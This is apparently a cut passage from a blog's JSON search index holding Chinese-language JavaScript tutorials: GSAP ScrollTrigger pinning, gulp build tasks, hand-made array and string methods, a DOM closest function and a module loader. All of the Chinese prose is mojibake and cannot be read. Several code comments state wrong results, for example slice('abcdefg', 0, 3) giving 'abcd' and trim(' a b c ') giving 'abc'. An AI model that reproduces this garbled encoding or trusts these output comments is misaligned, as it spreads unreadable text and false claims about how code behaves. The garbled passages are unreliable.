ä¸Šä¸€æ®µè·é›¢ã€ã€‚æˆ‘çŸ¥é“é€™æ¨£å­è¬›å¾ˆé›£ç†è§£ï¼Œæ‰€ä»¥ç›´æ¥ä¾†çœ‹ç¯„ä¾‹å§ã€‚ ç¾åœ¨æŠŠ pinSpacing è¨­ç‚º trueï¼š æ³¨æ„åˆ°è—è‰²æ–¹å¡Šè·Ÿæ©˜è‰²æ–¹å¡Šä¸€é–‹å§‹å°±ç”¢ç”Ÿäº†ä¸€æ®µã€Œè·é›¢ã€ï¼Œé€™æ®µè·é›¢å°±æ˜¯é€é pinSpacing ä¾†ç”¢ç”Ÿçš„ã€‚è€Œä¸”é€™å€‹è·é›¢æœƒç®—çš„å‰›å‰›å¥½ï¼Œç•¶è—è‰²æ–¹å¡ŠçµæŸ pin æ™‚æœƒæ­£å¥½åœåœ¨å®ƒåŸæœ¬è·Ÿæ©˜è‰²æ–¹å¡Šæ‡‰è©²ç›¸éš”çš„è·é›¢ï¼Œå‡è¨­å®ƒå€‘åŸæœ¬æœ‰ 10px çš„é–“éš”ï¼Œé‚£è—è‰²æ–¹å¡ŠçµæŸ pin æ™‚å°±æœƒåœåœ¨æ©˜è‰²æ–¹å¡Šä¸Šæ–¹ 10px çš„è·é›¢ã€‚ å¦‚æœæœ‰é»é›£ç†è§£çš„è©±æˆ‘ç›´æ¥ç¤ºç¯„çµ¦ä½ çœ‹ï¼ˆç¾åœ¨æŠŠæ–¹å¡ŠåŠ ä¸Š marginï¼‰ï¼š å¦‚æœé‚„æ˜¯ä¸æ‡‚çš„è©±ï¼Œè‡ªå·±åˆ° ç¯„ä¾‹ å»ç©ç©çœ‹å§ã€‚ å¯¦ä½œç°¡æ˜“çš„è¦–å·®æ•ˆæœåœ¨çŸ¥é“ pin è·Ÿ pinSpacing çš„åŸç†å¾Œï¼Œå°±å¯ä»¥åšå‡ºé€™æ¨£çš„æ•ˆæœï¼š æˆ‘çš„æ€è·¯æ˜¯é€™æ¨£ï¼š å»ºç«‹ä¸€å€‹ sectionï¼ˆ100vh æ»¿ç‰ˆé«˜ï¼‰ åœ¨ section ä¸­æ”¾ç½®å·¦å³å„ 50% çš„å€å¡Šï¼Œä¸¦é€é absolute å®šä½åœ¨ section çš„å·¦é‚Šèˆ‡å³é‚Š æ­¥é©ŸäºŒçš„å·¦å³ 50% å€å¡Šè¦é€é z-index ä¾†ç–Šä¸‰å±¤ï¼Œèª¿æ•´åœ–å±¤é †åº é€é scrollTrigger ä¾†è¨­ç½®å‹•ç•«ï¼Œtrigger ç‚º sectionã€‚è§¸ç™¼é»ç‚º section æœ€ä¸Šæ–¹ï¼ŒçµæŸé»ç‚º section æœ€ä¸‹æ–¹ï¼Œè€Œ scroller-start / scroller-end çš†ç‚º viewport çš„æœ€ä¸Šæ–¹ï¼ˆ0%ï¼‰ å»ºç«‹ timelineï¼Œç¬¬ä¸€æ®µè¦æŠŠå·¦é‚Šå‘ä¸Šä½ç§» 100%ï¼Œå³é‚Šå‘ä¸‹ä½ç§» 100%ï¼Œç¬¬äºŒæ®µä¹Ÿä»¥æ­¤é¡æ¨ã€‚ é€™å€‹ç¯„ä¾‹æˆ‘å‰›é–‹å§‹å¯¦ä½œçš„æ™‚å€™æœ‰ç¢°åˆ°ä¸€å€‹ä¸å¤ªæ‡‚çš„åœ°æ–¹ï¼Œå°±æ˜¯ç‚ºä»€éº¼section æ˜æ˜åªæœ‰è¨­ç½® 100vh è€Œå·²ï¼Œæ•´å€‹ç¶²é çš„é«˜åº¦å»æ˜¯ 200vhï¼Œä¸¦ä¸”ç”¢ç”Ÿæ»¾è»¸ï¼Ÿ å…¶å¯¦æ˜¯å› ç‚ºå‰é¢ä»‹ç´¹çš„ pinSpacingï¼Œé è¨­ true æ™‚ä»–æœƒè‡ªå‹•ç”¢ç”Ÿä¸€æ®µè·é›¢ï¼Œè®“ä½ åœ¨é€™æ®µ pin çµæŸæ™‚å¯ä»¥å‰›å¥½è·Ÿä¸‹é¢çš„å…ƒç´ ç„¡ç¸«æ¥è»Œï¼Œä¹Ÿé¿å…æ‰ pin çš„æœŸé–“æœƒè¦†è“‹åˆ°ä¸‹é¢å…ƒç´ çš„å•é¡Œã€‚ è€Œé€™è£¡ section æœƒ pin ä½çš„ç¯„åœæ­£å¥½æ˜¯ 100vhï¼Œæ‰€ä»¥é¡å¤–ç”¢ç”Ÿå‡ºä¾†çš„ç¯„åœå°±æœƒæ˜¯ 100vhï¼Œæ‰€ä»¥è·ŸåŸæœ¬çš„é«˜åº¦åŠ èµ·ä¾†å°±æœƒæ˜¯ 200vhã€‚ é€™æ®µæ¯”è¼ƒè¤‡é›œä¸€é»ï¼Œå»ºè­°å¯¦éš›åˆ° ç¯„ä¾‹ çœ‹ä¸€ä¸‹åŸå§‹ç¢¼è·Ÿè©¦è©¦çœ‹ï¼Œæ‡‰è©²å°±æœƒæ¯”è¼ƒæ¸…æ¥šäº†ã€‚ å¯¦ä½œç°¡æ˜“çš„é€²å ´æ•ˆæœ é€™å€‹ç¯„ä¾‹ä¸»è¦æ˜¯ç·´ç¿’å° ScrollTrigger çš„æ‡‰ç”¨ï¼Œä¹Ÿé †ä¾¿ä»‹ç´¹å¹¾å€‹æ–°çŸ¥è­˜ï¼š ScrollTrigger.create å¯ä»¥é€éé€™ç¨®æ–¹å¼ä¾†è¨­å®šæ»¾è»¸è§¸ç™¼ï¼Œä¸ç”¨ä¸€å®šè¦ç¶åœ¨ tween æˆ– timeline ä¸Š gsap.utils.toArray('.selector') å…¶å¯¦å°±è·Ÿ querySelectorAll å·®ä¸å¤šï¼Œå·®åˆ¥åœ¨æ–¼å®ƒæœƒè‡ªå‹•å¹«ä½ è½‰æˆ Arrayï¼Œè€Œä¸æ˜¯ NodeListã€‚ è‡³æ–¼æ€è·¯çš„éƒ¨åˆ†ç°¡å–®èªªä¸€ä¸‹ï¼š å°æ¯å€‹æ–¹å¡Šè¨­ç½®ç¨ç«‹çš„ ScrollTriggerï¼Œä¸¦ä¸”æ ¹æ“šé †åºä¾†æ±ºå®šå¾ã€Œå·¦é‚Š / å³é‚Šã€ä¾†é€²å ´ å°æ¯å€‹æ–‡å­—æ®µè½è¨­ç½®ç¨ç«‹çš„ ScrollTriggerï¼Œé€²å…¥ scroller-start æ™‚æ’­æ”¾å‹•ç•«ï¼ˆåˆ©ç”¨ fromToï¼‰ æ¸¸æ¨™åªè¦ä¸åœé–ƒçˆå³å¯ï¼Œæ‰€ä»¥åªéœ€è¦è¨­å®šé–ƒçˆå‹•ç•«å¾Œå°±è¡Œäº† æœ€å¾Œè€è©±ä¸€å¥ï¼Œæƒ³ç†è§£ç´°ç¯€çš„è©±å¯ä»¥åƒè€ƒåŸå§‹ç¢¼ã€‚","link":"/2022/11/17/gsap-scroll-trigger/"},{"title":"gulp çš„ä½¿ç”¨æ–¹æ³•","text":"é›–ç„¶é€æ¼¸æ²’è½ï¼Œä½†é‚„æ˜¯æœ‰ä¸éŒ¯ç”¨çš„æ™‚æ©Ÿã€‚ ç°¡è¿°å…ˆå®‰è£ gulp éœ€è¦çš„å¥—ä»¶ï¼š gulp-cliï¼ˆå¯è£åœ¨å…¨åŸŸï¼‰ gulp å®‰è£å®Œå¾ŒåŸ·è¡Œ gulp --version æˆ– npx gulp --version ç¢ºèªæœ‰ç‰ˆæœ¬è³‡è¨Šå°± OK äº†ã€‚ åŸºæœ¬çµæ§‹1234567function defaultTask(cb) { // åœ¨é€™è£¡å¯«è¦åŸ·è¡Œçš„ä»»å‹™ï¼Œå¯ä»¥æ˜¯ plug-in æˆ–è‡ªå·±æ // ä»»å‹™åŸ·è¡Œå®Œå¾Œå°±å‘¼å« cb å‘Šè¨´ gulp ä»»å‹™çµæŸ cb();}// exports.ä»»å‹™åç¨± = åŸ·è¡Œä»»å‹™çš„ functionexports.default = defaultTask åœ¨é è¨­çš„è¨­å®šä¸‹ï¼ŒåŸ·è¡Œ gulp æœƒè‡ªå‹•å»æ‰¾ default çš„ä»»å‹™åç¨±ã€‚æ‰€ä»¥ä¸Šé¢å°±æœƒå¾ default è£¡é¢æ‰¾åˆ° defaultTask ä¸¦ä¸”åŸ·è¡Œã€‚ ç•¶ç„¶ï¼Œå¦‚æœä½ è¦è‡ªè¡ŒæŒ‡å®šä»»å‹™ä¹Ÿå¯ä»¥é€™æ¨£ä¸‹ï¼š 12# å‡è¨­æœ‰ exports.yoyoyogulp yoyoyo ç‰›åˆ€å°è©¦ï¼ä¸² babelç”¨ gulp çš„ç¬¬ä¸€ä»¶äº‹æ˜¯æ‰¾å‡ºä½ æƒ³åŸ·è¡Œçš„ä»»å‹™å¥—ä»¶ã€‚ å¸¸è¦‹çš„ä»»å‹™é€šå¸¸éƒ½æœƒæœ‰äººå®¶å¯«å¥½çš„ï¼ŒçœŸçš„æ‰¾ä¸åˆ°æ‰éœ€è¦è‡ªå·±å¯« JSï¼Œæ‰€ä»¥æœ‰ç¾æˆçš„å°±ç›¡é‡æ‹¿ä¾†ç”¨å°±å¥½ã€‚ æ¥è‘—åƒè€ƒ æ–‡ä»¶ çš„èªªæ˜ä¾†åšè¨­å®šï¼š 1234567891011121314151617181920// æŠŠ gulp è®€æª”è·Ÿè¼¸å‡ºçš„ function å¼•å…¥const { src, dest } = require('gulp');// ç”¨ä¾†åŸ·è¡Œ babel é€™å€‹ task çš„å¥—ä»¶const babel = require('gulp-babel');// å®šç¾©é€™å€‹ä»»å‹™è¦åšçš„äº‹æƒ…function ComplieJS() { /* 1. ç”¨ src æŠŠæ‰€æœ‰ .js æª”æ¡ˆè®€å…¥ 2. åŸ·è¡Œ babel 3. è¼¸å‡ºåˆ° output è³‡æ–™å¤¾ï¼ˆdestinationï¼‰ */ return src('src/*.js') // å·²ç¶“æœ‰è¨­å®š babel.config.json çš„è©±å¯ä»¥çœç•¥ .pipe(babel({ presets: ['@babel/env'] })) .pipe(dest('output/'));}exports.default = ComplieJS æ¥ä¸‹ä¾†åŸ·è¡Œ gulpï¼ŒæˆåŠŸçš„è©±å°±æœƒæ‹¿åˆ° babel å¾Œçš„ JSã€‚ ç•¶ä»»å‹™è¶Šä¾†è¶Šå¤šæ™‚èˆ‰ä¾‹ä¾†èªªï¼š 1234567891011121314151617181920212223242526272829303132333435363738const { src, dest, parallel, series } = require('gulp');const babel = require('gulp-babel');const uglify = require('gulp-uglify');const rename = require(\"gulp-rename\");const sass = require('gulp-sass')(require('sass'));const cleanCSS = require('gulp-clean-css');/* 1. ç”¨ babel ç·¨è­¯ JS 2. å£“ç¸® 3. é‡æ–°å‘½åå¾Œè¼¸å‡º */function complieJS () { return src('src/*.js') .pipe(babel()) .pipe(dest('js/')) .pipe(uglify()) .pipe(rename('min.js')) .pipe(dest('js/'));}/* 1. ç”¨ sass ç·¨è­¯ scss 2. å£“ç¸® 3. é‡æ–°å‘½åå¾Œè¼¸å‡º */function complieCSS () { return src('src/*.scss') .pipe(sass().on('error', sass.logError)) .pipe(dest('css/')) .pipe(cleanCSS()) .pipe(rename('min.css')) .pipe(dest('css/'));}// åŒæ™‚é€²è¡Œexports.default = parallel(complieJS, complieCSS);// ä¸€å€‹ä¸€å€‹é€²è¡Œexports.default = series(complieJS, complieCSS); é€™é‚Šåªæ˜¯æƒ³ä»‹ç´¹ parallel series çš„ç”¨æ³•ï¼Œå¦‚æœä»»å‹™ä¹‹é–“æ²’æœ‰ä¾è³´æ€§çš„è©±å¯ä»¥ç”¨ parallelï¼ˆå¹³è¡ŒåŸ·è¡Œï¼‰ï¼ŒåŸ·è¡Œä¸Šæœƒæ¯”è¼ƒå¿«ã€‚","link":"/2022/02/28/gulp-usage/"},{"title":"å¯¦ä½œé™£åˆ—å…§å»ºå‡½å¼","text":"è‡ªå·±åšåšçœ‹ã€‚ Array.map12345678910111213141516171819202122232425262728293031323334353637383940function map(arr, handler) { // æ–°é™£åˆ— let newArr = [] // éæ­·é™£åˆ—å…§å®¹ for(let i=0; i&lt;arr.length; i++) { // å°‡å›å‚³å€¼å¯«å…¥æ–°é™£åˆ— // å‚³å…¥ä¸‰å€‹åƒæ•¸ï¼š // 1. ç›®å‰å…ƒç´  // 2. ç´¢å¼•å€¼ // 3. ä¾†æºé™£åˆ— newArr[i] = handler(arr[i], i, arr) } return newArr}const result = map([1, 2, 3], (elem, index, src) =&gt; { // ä¾†æºé™£åˆ— console.log('srcArray:', src) // ç´¢å¼•å€¼ console.log('index:', index) // ç›®å‰å…ƒç´  console.log('elem:', elem) // å…ƒç´ è™•ç†å¾Œçš„å›å‚³å€¼ return elem * 2})console.log('return value:', result)// output: srcArray: [1, 2, 3]// output: index: 0// output: elem: 1// output: srcArray: [1, 2, 3]// output: index: 1// output: elem: 2// output: srcArray: [1, 2, 3]// output: index: 2// output: elem: 3// output: return value: [2, 4, 6] Array.lastIndexOf1234567891011121314function lastIndexOf(arr, target) { // åå‘è¿´åœˆ for(let i=arr.length; i&gt;=0; i--) { // ç¬¦åˆ target å°±å›å‚³ç›®å‰ç´¢å¼•å€¼ if(target === arr[i]) { return i } } // æ²’æœ‰ç¬¦åˆçš„ target å›å‚³ -1 return -1}console.log(lastIndexOf([1, 2, 2, 3], 2)) // 2 console.log(lastIndexOf([1, 2, 2, 3], 3)) // 3console.log(lastIndexOf([1, 2, 2, 3], 4)) // -1 Array.indexOf123456789101112131415function indexOf(arr, searchElement) { // éæ­·é™£åˆ—å…ƒç´  for(let i=0; i&lt;arr.length; i++) { // æ‰¾åˆ°ç›®æ¨™ if(arr[i] === searchElement) { // å›å‚³ç´¢å¼•å€¼ return i } } // æ‰¾ä¸åˆ° return -1}console.log(indexOf([1, 2, 2, 3], 2)) // 1console.log(indexOf([1, 2, 2, 3], 3)) // 3console.log(indexOf([1, 2, 2, 3], 4)) // -1 Array.reverseè§£æ³• 1 =&gt; åå‘è¿´åœˆ + pushï¼š 1234567891011121314151617function reverse(arr) { let result = [] // åå‘è¿´åœˆ for(let i=arr.length-1; i&gt;=0; i--) { result.push(arr[i]) } // ä¿®æ”¹åŸé™£åˆ— for(let i=0; i&lt;arr.length; i++) { arr[i] = result[i] } // å›å‚³å€¼ return result}const array1 = [1, 2, 3]const array2 = reverse(array1)console.log(array1) // [3, 2, 1] console.log(array2) // [3, 2, 1] è§£æ³• 2 =&gt; è¿´åœˆ + å‹•æ…‹ç´¢å¼•å€¼ï¼š 12345678910111213141516171819202122function reverse(arr) { // å‹•æ…‹ç´¢å¼•å€¼ // i=0 =&gt; k=2 // i=1 =&gt; k=1 // i=2 =&gt; k=0 let k = arr.length - 1 let result = [] // æ­£å‘è¿´åœˆ for(let i=0; i&lt;arr.length; i++) { result[i] = arr[k-i] } // ä¿®æ”¹åŸé™£åˆ— for(let i=0; i&lt;arr.length; i++) { arr[i] = result[i] } // å›å‚³å€¼ return result}const array1 = [1, 2, 3]const array2 = reverse(array1)console.log(array1) // [3, 2, 1] console.log(array2) // [3, 2, 1] Array.fill123456789101112131415161718function fill(arr, value) { const result = [] // éæ­·é™£åˆ—å…ƒç´  for(let i=0; i&lt;arr.length; i++) { result[i] = value } // ä¿®æ”¹åŸé™£åˆ— for(let i=0; i&lt;arr.length; i++) { // æŠŠå€¼å¡«å…¥æ–°é™£åˆ— arr[i] = result[i] } // å›å‚³çµæœ return result}const array1 = [1, 2, 3]const array2 = fill(array1, 'A')console.log(array1) // ['A', 'A', 'A']console.log(array2) // ['A', 'A', 'A'] Array.join1234567891011121314151617function join(arr, separator) { let result = '' // éæ­·é™£åˆ—å…ƒç´  for(let i=0; i&lt;arr.length; i++) { // ä¸æ˜¯æœ€å¾Œä¸€å€‹å…ƒç´ æ‰æ’å€¼ if(i !== arr.length-1) { result += arr[i] + separator } else { // æœ€å¾Œä¸€å€‹å…ƒç´ ç›´æ¥å¡«å…¥ result += arr[i] } } // å›å‚³çµæœ return result}const str = join([1, 2, 3], ',')console.log(str) // '1,2,3' Array.filter123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function filter(arr, callback) { let result = [] let k = 0 for(let i=0; i&lt;arr.length; i++) { // æŠŠå›å‚³ true çš„å…ƒç´ åŠ å…¥åˆ°çµæœé™£åˆ— // å‚³å…¥ä¸‰å€‹åƒæ•¸ // 1. ç›®å‰çš„å…ƒç´  // 2. ç´¢å¼•å€¼ // 3. ä¾†æºé™£åˆ— if(callback(arr[i], i, arr)) { result[k] = arr[i] // æ›´æ–°ç´¢å¼•å€¼ k++ } } // å›å‚³çµæœé™£åˆ— return result}const newArray = filter([1, 2, 3, 4, 5], (elem, index, src) =&gt; { // ä¾†æºé™£åˆ— console.log('srcArray:', src) // ç´¢å¼•å€¼ console.log('index:', index) // ç›®å‰å…ƒç´  console.log('elem: ', elem) // å›å‚³åˆ¤æ–·çµæœ return elem &gt; 2})console.log('newArray:', newArray) // output: srcArray: [1, 2, 3, 4, 5]// output: index: 0// output: elem: 1// output: srcArray: [1, 2, 3, 4, 5]// output: index: 1// output: elem: 2// output: srcArray: [1, 2, 3, 4, 5]// output: index: 2// output: elem: 3// output: srcArray: [1, 2, 3, 4, 5]// output: index: 3// output: elem: 4// output: srcArray: [1, 2, 3, 4, 5]// output: index: 4// output: elem: 5// output: newArray: [3, 4, 5] Array.slice12345678910111213141516var arr = [1, 2, 3, -1, -2]var myResult = mySlice(arr, 1)function mySlice(array, optionStart, optionEnd) { var result = [] var start = optionStart || 0 var end = optionEnd || array.length if (start &gt; array.length) start = 0 if (end &gt; array.length) end = array.length for(var i=start; i&lt;end; i++) { result.push(array[i]) } return result} Array.reduce123456789101112function reduce(arr, Afunction) { // ç´¯åŠ å™¨ let accumulator = 0 for(let i=0; i&lt;arr.length; i++) { // æ›´æ–°ç´¯åŠ å™¨çš„å€¼ accumulator = Afunction(accumulator, arr[i]) } // å›å‚³ç´¯åŠ çµæœ return accumulator}const result = reduce([1, 2, 3, 4 ,5],(acc, elem) =&gt; acc + elem)console.log(result) // 15","link":"/2021/12/20/handmade-built-in-function-array/"},{"title":"å¯¦ä½œå­—ä¸²å…§å»ºå‡½å¼","text":"è‡ªå·±åšåšçœ‹ã€‚ String.repeat12345678function repeat(str, times) { var result = '' for(var i=0; i&lt;times; i++) { result += str } return result}console.log(repeat('a', 5)) // aaaaa String.trimè§£æ³• 1 =&gt; æ‰¾å‡ºé ­å°¾çš„ç´¢å¼•å€¼ï¼š 12345678910111213141516171819202122232425262728293031323334function trim(s) { // çµæœå­—ä¸² let result = '' // å„²å­˜èµ·é»ä½ç½® let first = 0 // å„²å­˜çµ‚é»ä½ç½® // è¦æ³¨æ„è¼¸å…¥ç‚º ' ' çš„ edge case let last = s.length - 1 // æ‰¾å‡ºå¾å‰é¢æ•¸ä¾†ç¬¬ä¸€å€‹éç©ºç™½å­—å…ƒçš„ç´¢å¼•å€¼ for(let i=0; i&lt;s.length; i++) { if(s[i] !== ' ') { first = i break } } // æ‰¾å‡ºå¾å¾Œé¢æ•¸ä¾†ç¬¬ä¸€å€‹éç©ºç™½å­—å…ƒçš„ç´¢å¼•å€¼ for(let i=s.length-1; i&gt;=0; i--) { if(s[i] !== ' ') { last = i break } } // çµ„åˆå­—ä¸² // æ³¨æ„è¦ &lt;= æ‰èƒ½å–åˆ°çµ‚é»ä½ç½®å­—å…ƒ for(let i=first; i&lt;=last; i++) { result += s[i] } return result}console.log(trim(' abc ')) // abcconsole.log(trim(' a b c ')) // abcconsole.log(trim(' abc')) // abcconsole.log(trim('abc ')) // abc è§£æ³• 2 =&gt; å…ˆå»æ‰å‰é¢çš„ç©ºç™½ï¼Œå†å»æ‰å¾Œé¢çš„ç©ºç™½ï¼š 12345678910111213141516171819202122232425262728293031323334function trim(s) { // å„²å­˜ç‹€æ…‹ let isFrontWhiteSpaceFounded = false // å„²å­˜ç‹€æ…‹ let isBackWhiteSpaceFounded = false // å„²å­˜å»æ‰å‰é¢ç©ºç™½å¾Œçš„å­—ä¸² let front = '' // å„²å­˜å»æ‰å¾Œé¢ç©ºç™½å¾Œçš„å­—ä¸² let back = '' // å…ˆå»æ‰å‰é¢çš„ç©ºç™½ for(let i=0; i&lt;s.length; i++) { // ç¬¬ä¸€å€‹éç©ºç™½å­—å…ƒæ‰¾åˆ°å¾Œï¼ŒisFrontWhiteSpaceEnd æœƒè®Š true // æ‰€ä»¥æ¥ä¸‹ä¾†å‡ºç¾çš„ç©ºç™½å­—å…ƒä¹Ÿéƒ½æœƒè¢«å¡«å…¥ if(s[i] !== ' ' || isFrontWhiteSpaceFounded) { front += s[i] isFrontWhiteSpaceFounded = true } } // æ¥è‘—å»æ‰å¾Œé¢çš„ç©ºç™½ for(let i=front.length-1; i&gt;=0; i--) { // ç¬¬ä¸€å€‹éç©ºç™½å­—å…ƒæ‰¾åˆ°å¾Œï¼ŒisBackWhiteSpaceFounded æœƒè®Š true // æ‰€ä»¥æ¥ä¸‹ä¾†å‡ºç¾çš„ç©ºç™½å­—å…ƒä¹Ÿéƒ½æœƒè¢«å¡«å…¥ if(front[i] !== ' ' || isBackWhiteSpaceFounded) { // é †åºè¦é€™æ¨£æ‰æœƒå°ï¼Œä¸ç„¶æœƒè®Šæˆé¡›å€’æ–‡å­— back = front[i] + back isBackWhiteSpaceFounded = true } } return back}console.log(trim(' abc ')) // abcconsole.log(trim(' a b c ')) // abcconsole.log(trim(' abc')) // abcconsole.log(trim('abc ')) // abc String.toLowerCase1234567891011121314151617function toLowerCase(s) { let result = '' for(let i=0; i&lt;s.length; i++) { // å¦‚æœæ˜¯å¤§å¯«å­—æ¯ if(s[i]&gt;='A' &amp;&amp; s[i]&lt;='Z') { // è½‰æˆå°å¯« result += String.fromCharCode(s[i].charCodeAt(0) + 32) } else { // ä¸æ˜¯å¤§å¯«å­—æ¯ä¸åšè™•ç† result += s[i] } } return result}console.log(toLowerCase('ZZVa asS a C AsABC!!!!')) // zzva ass a c asabc!!!!console.log(toLowerCase('!!!!')) // !!!!console.log(toLowerCase(' ')) // ' ' String.endsWith123456789101112131415161718192021function endsWith(str, searchString) { // æœå°‹å­—ä¸²é•·åº¦ &gt; æ¯”å°å­—ä¸²é•·åº¦ // æœå°‹å­—ä¸²ç‚ºç©ºå­—ä¸² if(searchString.length &gt; str.length || searchString.length === 0) return false // å„²å­˜æœå°‹å­—ä¸²æœ€å¾Œä¸€å€‹å­—çš„ç´¢å¼•å€¼ let k = searchString.length - 1 // åå‘è¿´åœˆ for(let i=str.length-1; i&gt;=0; i--) { // æ¯”å°å…©å­—ä¸²çš„å€’æ•¸ç¬¬ n å€‹å­—æ˜¯å¦ç›¸åŒ if(str[i] !== searchString[k--]) return false // æ²’æœ‰å­—å¯ä»¥æ¯”äº† if(k &lt; 0) break } // ç¬¦åˆ return true}console.log(endsWith('abc', 'c')) // trueconsole.log(endsWith('abc', 'bc')) // trueconsole.log(endsWith('abc', 'abc')) // trueconsole.log(endsWith('abc', 'aaabc')) // falseconsole.log(endsWith('abc', '')) // false String.padEndè§£æ³• 1 =&gt; ç›´æ¥æŠŠå¡«å……æ–‡å­—å¡«å…¥ï¼Œæœ€å¾Œå†æŠŠå¤šé¤˜çš„éƒ¨åˆ†å»æ‰ï¼š 12345678910111213141516171819202122232425function padEnd(str, targetLength, padString=' ') { // é•·åº¦ &lt;= åŸå­—ä¸² // å¡«å…¥æ–‡å­—ç‚ºç©ºå­—ä¸² if( targetLength &lt;= str.length || !(padString) ) return str // çµæœå­—ä¸² let result = '' // æœªé”åˆ°ç›®æ¨™é•·åº¦æ™‚ä¸æœƒåœæ­¢ while(str.length &lt; targetLength) { // å¡«å…¥æ–‡å­— str += padString } // å»æ‰è¶…å‡ºç¯„åœçš„æ–‡å­— for(let i=0; i&lt;targetLength; i++) { result += str[i] } return result}console.log(padEnd('abc', 10, 'a')) // abcaaaaaaaconsole.log(padEnd('abc', 10, 'dog')) // abcdogdogdconsole.log(padEnd('abc', 2, 'abbc')) // abcconsole.log(padEnd('abc', 2, '')) // abcconsole.log(padEnd('abc', 5)) // 'abc ' è§£æ³• 2 =&gt; æŠŠå¡«å……æ–‡å­—ä¸€å€‹å­—ä¸€å€‹å­—åŠ å…¥ï¼š 123456789101112131415161718192021222324function padEnd(str, targetLength, padString=' ') { // é•·åº¦ &lt;= åŸå­—ä¸² // å¡«å……æ–‡å­—ç‚ºç©ºå­—ä¸² if( targetLength &lt;= str.length || !(padString) ) return str // å‹•æ…‹ç´¢å¼•å€¼ let k = 0 // æœªé”åˆ°ç›®æ¨™é•·åº¦æ™‚ä¸æœƒåœæ­¢ while(str.length &lt; targetLength) { // å¡«å…¥æ–‡å­— str += padString[k++] // å·²ç¶“æ˜¯å¡«å……æ–‡å­—çš„æœ€å¾Œä¸€å€‹å­—ï¼Œæ­¸é›¶ if(k === padString.length) k=0 } // å›å‚³çµæœ return str}console.log(padEnd('abc', 10, 'a')) // abcaaaaaaaconsole.log(padEnd('abc', 10, 'dog')) // abcdogdogdconsole.log(padEnd('abc', 2, 'abbc')) // abcconsole.log(padEnd('abc', 2, '')) // abcconsole.log(padEnd('abc', 5)) // 'abc ' String.slice1234567891011121314function slice(str, start, end) { // æ²’æœ‰ end å€¼ï¼Œè¨­ç‚ºå­—ä¸²é•·åº¦ if(!end) end = str.length // çµæœ let result = '' // æ ¹æ“š start end ç¯„åœæ“·å–æ–‡å­— for(let i=start; i&lt;end; i++) { result += str[i] } // å›å‚³çµæœ return result}console.log(slice('abcdefg', 0, 3)) // abcdconsole.log(slice('abcdefg', 3, )) // defg","link":"/2021/12/21/handmade-built-in-function-string/"},{"title":"å¯¦ä½œ DOM çš„ closest æ–¹æ³•","text":"çœ‹åˆ°éè¿´å°±æƒ³è¨˜ä¸‹ä¾†ã€‚ ç°¡è¿°element.closest æ˜¯ä¸€å€‹ DOM çš„æ–¹æ³•ï¼Œç”¨ä¾†æ‰¾ç¬¬ä¸€å€‹ç¬¦åˆã€Œé¸å–å™¨ã€çš„çˆ¶å…ƒç´ ã€‚ æ€è·¯å¤§æ¦‚æ˜¯é€™æ¨£å­ï¼š æ‰¾åˆ°ä¸Šå±¤çˆ¶å…ƒç´  å¦‚æœçˆ¶å…ƒç´ ç¬¦åˆæœå°‹çš„ class åç¨±ï¼Œå°±æŠŠçˆ¶å…ƒç´ å›å‚³ å¦‚æœä¸Šå±¤é‚„æœ‰å…ƒç´ ï¼Œé‡è¤‡ä¸Šé¢å…©å€‹æ­¥é©Ÿ å‚™è¨»ï¼šåªè¦æ˜¯ DOM ä¸­çš„ã€Œå…ƒç´ ç¯€é»ã€éƒ½æœƒæœ‰ classList å±¬æ€§ï¼Œæ‰€ä»¥ node.classList æ˜¯åœ¨æª¢æŸ¥ã€Œæ˜¯ä¸æ˜¯å…ƒç´ ç¯€é»ã€ï¼Œåªè¦ä¸ç¬¦åˆå°±è¡¨ç¤ºæ‰¾åˆ°åº•äº†ï¼ˆæœ€å¾Œæœƒæ‰¾åˆ° &lt;html&gt; çš„çˆ¶å±¤ -&gt; ä¹Ÿå°±æ˜¯ undefinedï¼‰ è¿´åœˆè¿­ä»£æ³•1234567891011function closest(node, className) { // å¦‚æœç¯€é»å­˜åœ¨ AND æœ‰ classList å±¬æ€§ while (node &amp;&amp; node.classList) { // æª¢æŸ¥ class åç¨±æœ‰æ²’æœ‰ç¬¦åˆï¼Œæœ‰çš„è©±å°±å›å‚³ç¯€é» if (node.classList.contains(className)) { return node } // æ›´æ–°ç¯€é»ï¼ˆä¸Šä¸€å±¤çˆ¶å…ƒç´ ï¼‰ node = node.parentNode }} éè¿´æ³•12345678910111213function closestRecursive(node, className) { // å¦‚æœç¯€é»ä¸å­˜åœ¨ or ä¸åŒ…å« class // å›å‚³ null ä»£è¡¨æ‰¾åˆ°åº•äº† if (!node || !node.classList) { return null } // å¦‚æœç¬¦åˆ classNameï¼Œä»£è¡¨æ‰¾åˆ°äº† if (node.classList.contains(className)) { return node } // é‚„æ²’æ‰¾å®Œï¼Œç¹¼çºŒå¾€ä¸Šä¸€å±¤æ‰¾ return closestRecursive(node.parentNode, className)}","link":"/2022/01/21/handmade-closest-function/"},{"title":"å¯¦ä½œæ¨¡çµ„æ©Ÿåˆ¶","text":"æœ‰æ±è¥¿æä¸æ¸…æ¥šï¼Ÿå¯¦ä½œä¸€éå°±æ¸…æ¥šäº†ã€‚ å‰æƒ…æè¦ï¼ˆæ³¨æ„ï¼šé–±è®€é€™ç¯‡æ–‡ç« å‰è«‹å…ˆå¼„æ‡‚ ç†è§£ function å‚³éåƒæ•¸çš„æ©Ÿåˆ¶ çš„å…§å®¹ï¼Œä¸ç„¶ä½ æœƒçœ‹å¾—éœ§ç…ç…ã€‚ï¼‰ é€™è£¡è¦å¯¦ä½œçš„æ˜¯å¯ä»¥åœ¨ç€è¦½å™¨ä¸Šé‹è¡Œçš„ module.exports è·Ÿ require ç°¡å–®å›é¡§ä¸€ä¸‹ç”¨é€”ï¼Œé€™è£¡æœ‰å…©å€‹æª”æ¡ˆåˆ†åˆ¥ç‚º main.js è·Ÿ utils.js main.js è² è²¬å¼•å…¥ utils.js ä¸­å¯«å¥½çš„æ¨¡çµ„ï¼Œå¦‚ä¸‹ï¼š 123456789// utils.jsfunction calculate(n) { return ((n * 100 + 20 - 4)) % 10 + 3}module.exports = { cal: calculate, name: 'hello'} 1234// main.jsvar obj = require('./utils')console.log(obj.cal(30)) // 9console.log(obj.name) // hello å› ç‚º obj å¯¦éš›ä¸Šå„²å­˜çš„å€¼ç­‰åŒæ–¼ module.exports ç­‰è™Ÿå¾Œé¢çš„ç‰©ä»¶ï¼Œæ‰€ä»¥ä½ ä¹Ÿå¯ä»¥é€™æ¨£ç†è§£ï¼š 1234567// å¯ä»¥æƒ³æˆæ˜¯é€™æ¨£å­var obj = module.exports// ç¤ºæ„ç¢¼var obj = { cal: 